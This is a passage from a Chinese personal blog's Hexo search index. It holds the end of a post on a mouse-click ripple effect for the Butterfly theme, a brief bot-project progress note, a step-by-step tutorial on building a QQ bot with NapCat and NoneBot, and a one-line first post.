class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="创建配置文件（可选）"><a href="#创建配置文件（可选）" class="headerlink" title="创建配置文件（可选）"></a>创建配置文件（可选）</h2><p>在 <code>/source/_data/</code> 目录下创建 <code>mouse-effect.yml</code>（如果没有 <code>_data</code> 目录，请先创建）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 鼠标特效配置</span><br><span class="line">enable: true</span><br><span class="line">ripple_color: &#x27;#409EFF&#x27;  # 水波纹颜色</span><br><span class="line">enable_multi_color: false # 多色效果</span><br><span class="line">enable_trail: true        # 鼠标轨迹</span><br><span class="line">trail_color: &#x27;#409EFF&#x27;    # 轨迹颜色</span><br><span class="line">trail_size: 12            # 轨迹大小</span><br><span class="line">disable_on_mobile: true   # 移动端禁用</span><br></pre></td></tr></table></figure><h2 id="修改主题配置文件"><a href="#修改主题配置文件" class="headerlink" title="修改主题配置文件"></a>修改主题配置文件</h2><p>在 <code>_config.butterfly.yml</code> 中添加以下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">inject: </span><br><span class="line">  head:</span><br><span class="line">    - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/mouse-effect.css&quot;&gt;</span><br><span class="line">  bottom:</span><br><span class="line">    - &lt;script src=&quot;/js/mouse-effect.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后使用hexo三件套部署即可</p><h2 id="自定义调整"><a href="#自定义调整" class="headerlink" title="自定义调整"></a>自定义调整</h2><p>你可以通过修改配置来调整效果：</p><ul><li><p><strong>修改颜色</strong>：在 CSS 中修改 <code>rgba(64, 158, 255, 0.8)</code> 的颜色值</p></li><li><p><strong>调整大小</strong>：修改 CSS 中 <code>width</code> 和 <code>height</code> 的最终值</p></li><li><p><strong>调整速度</strong>：修改 <code>animation-duration</code> 的值</p></li><li><p><strong>禁用特效</strong>：在浏览器控制台中输入 <code>mouseEffect.disable()</code></p></li></ul><p>这个特效会在鼠标点击时产生蓝色的水波纹扩散效果，逐渐消失。如果你想要更丰富的效果，可以启用多色模式或鼠标轨迹效果。</p>]]></content>
      
      
      
        <tags>
            
            <tag> butterfly魔改 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工伊3.0制作进度20260120</title>
      <link href="/posts/47247/"/>
      <url>/posts/47247/</url>
      
        <content type="html"><![CDATA[<p>目前正在学习LangChain 1.0,搭建了一个勉强能用的智能体？<br>至少新建了一个文件夹<br>后面打算先把nonebot的一些插件整合进去<br>真的没有在咕咕咕😵‍💫</p>]]></content>
      
      
      <categories>
          
          <category> GYBot制作计划 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用NapCat+Nonebot创建一个属于自己的QQbot</title>
      <link href="/posts/5690/"/>
      <url>/posts/5690/</url>
      
        <content type="html"><![CDATA[<p>这篇文章使用的设备是windows 2019<br>NapCat版本为 NapCatQQ Desktop v1.7.28<br>Nonebot版本为 v2.4.4<br>如果某些选项或者参数不同，可能是以上某个版本不同导致的  </p><h2 id="NapCat下载"><a href="#NapCat下载" class="headerlink" title="NapCat下载"></a>NapCat下载</h2><p>首先进入<a href="https://github.com/NapNeko/NapCatQQ-Desktop/releases/tag/v1.7.28">https://github.com/NapNeko/NapCatQQ-Desktop/releases/tag/v1.7.28</a>下载NapCat Desktop安装包(GitHub可能需要使用梯子魔法)<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/1.png" alt="NapCAt Desktop"><br>我们选择NapCatQQ-Desktop.exe<br>下载完成后，不要着急启动安装程序，先分别创建一个NapCat文件夹和QQ文件夹，把NapCatQQ-Desktop.exe放在NapCat文件夹里，然后双击文件<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/2.png" alt="文件夹"><br>这边选择同意<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/3.png" alt="安装1"><br>选择开始安装<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/4.png" alt="安装2"><br>选择我是新手<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/5.png" alt="安装3"><br>选择安装，接着程序会自动给我们安装QQ<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/6.png" alt="安装4"><br>进度条走完以后，程序会让我们选择QQ安装路径，选择刚刚创建的QQ文件夹<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/7.png" alt="安装5"><br>下载完QQ就开始安装NapCat了，我们选择安装<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/8.png" alt="安装6"><br>下载完NapCat之后，选择下一步开始使用NapCat Desktop<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/9.png" alt="安装7"><br>然后我们将NapCat Desktop最小化，去下载Nonebot  </p><h2 id="Nonebot下载"><a href="#Nonebot下载" class="headerlink" title="Nonebot下载"></a>Nonebot下载</h2><p>Nonebot需要Python环境，这边就不过多赘述了。<br>建议下载Python3.11.X版本，会比较稳定，能兼容大部分插件，不建议去下载最新版本的Python，因为很多插件不兼容高版本的python<br>首先win+R，输入cmd，然后下载pipx库<br><code>pip install pipx</code><br>然后使用pipx安装nb-cli<br><code>pipx install nb-cli</code><br>安装完成之后，接着配置nb-cli的系统环境变量<br>打开 控制面板-&gt;系统和安全-&gt;系统<br>选择左边的高级系统设置，选择环境变量<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/10.png" alt="下载1"><br>双击系统变量里面的Path，选择新建，输入<code>C:\Users\Administrator\.local\bin</code><br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/11.png" alt="下载2"><br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/12.png" alt="下载3"><br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/13.png" alt="下载4"><br>然后点击全点确定，退出环境变量设置<br>接下来关掉原来的cmd窗口，创建一个文件夹Bot，打开Bot文件夹，在上方输入栏输入cmd并回车，打开一个新的cmd窗口(一定要打开新的cmd窗口)<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/14.png" alt="下载5"><br>输入nb，回车，如果跟下面的图片一样，则说明环境配置正确，否则需要重新配置环境<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/15.png" alt="下载6"><br>我们选择创建一个Nonebot项目，回车<br>然后选择bootstrap，回车<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/16.png" alt="下载7"><br>项目名称填自己的Bot名称，然后回车<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/17.png" alt="下载8"><br>选择OneBot v11协议(直接空格)，然后回车<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/18.png" alt="下载9"><br>一般驱动器只需要FastAPI就可以了，有些插件可能需要其他驱动器，之后也可以加<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/19.png" alt="下载10"><br>本地存储策略选择当前项目<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/20.png" alt="下载11"><br>立即安装依赖和创建虚拟环境都选Y<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/21.png" alt="下载12"><br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/22.png" alt="下载13"><br>内置插件可以选echo，便于测试<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/23.png" alt="下载14"><br>官方插件可以不选(之后也可以单独下载)，直接回车<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/24.png" alt="下载15"><br>Nonebot就下载好了  </p><h2 id="Nonebot配置"><a href="#Nonebot配置" class="headerlink" title="Nonebot配置"></a>Nonebot配置</h2><p>打开Bot文件夹，进入以你填的项目名称命名的文件夹，打开.env.prod文件(没有能打开这类文件软件的可以使用记事本)<br>加上一行<code>ONEBOT_ACCESS_TOKEN=XXXXXXX</code>其中XXXXXXX是你自己设置的TOKEN，用来之后与NapCat对接，然后保存并退出  </p><h2 id="NapCat配置"><a href="#NapCat配置" class="headerlink" title="NapCat配置"></a>NapCat配置</h2><p>打开之前的NapCat程序，选择开始使用<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/25.png" alt="配置1"><br>点击右下角的蓝色加号，添加Bot<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/26.png" alt="配置2"><br>Bot名称填你的Bot的名称，QQ号填你用于Bot的QQ号，其他可以不填<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/27.png" alt="配置3"><br>然后选择连接配置，选择WebSocket客户端，选择OK<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/28.png" alt="配置4"><br>勾选启用，名称随便填，URL填<code>ws://127.0.0.1:8080/onebot/v11/ws</code>,Token里面填刚刚在Nonebot配置里面的ONEBOT_ACCESS_TOKEN，重连间隔最好填0，其他不用改动<br><img src="/postdata/%E4%BD%BF%E7%94%A8NapCat-Nonebot%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQbot/29.png" alt="配置5"><br>然后选择OK，保存配置完毕  </p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>NapCat配置完成之后点击返回，然后点击刚刚配置好的Bot上方的启动，然后点击启动右边的查看日志，程序会自动跳出登录二维码，在手机端登录用于Bot的QQ进行扫描即可。这里NapCat启动完成，接着是Nonebot<br>接着打开Bot文件夹，进入以你填的项目名称命名的文件夹，在这个文件夹打开cmd窗口，输入<code>nb run</code>回车，过一会，Nonebot也启动完成  </p><h2 id="接下来"><a href="#接下来" class="headerlink" title="接下来"></a>接下来</h2><p>到这里，QQBot已经搭建完成了，接下来可以去Nonebot的官方插件市场<a href="https://nonebot.dev/store/plugins">https://nonebot.dev/store/plugins</a>，去下载有趣的插件，然后享受你的专属Bot</p>]]></content>
      
      
      <categories>
          
          <category> GYBot制作计划 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇博客</title>
      <link href="/posts/63785/"/>
      <url>/posts/63785/</url>
      
        <content type="html"><![CDATA[<p>菜鸟第一篇博客，就这样~</p>]]></content>
      
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
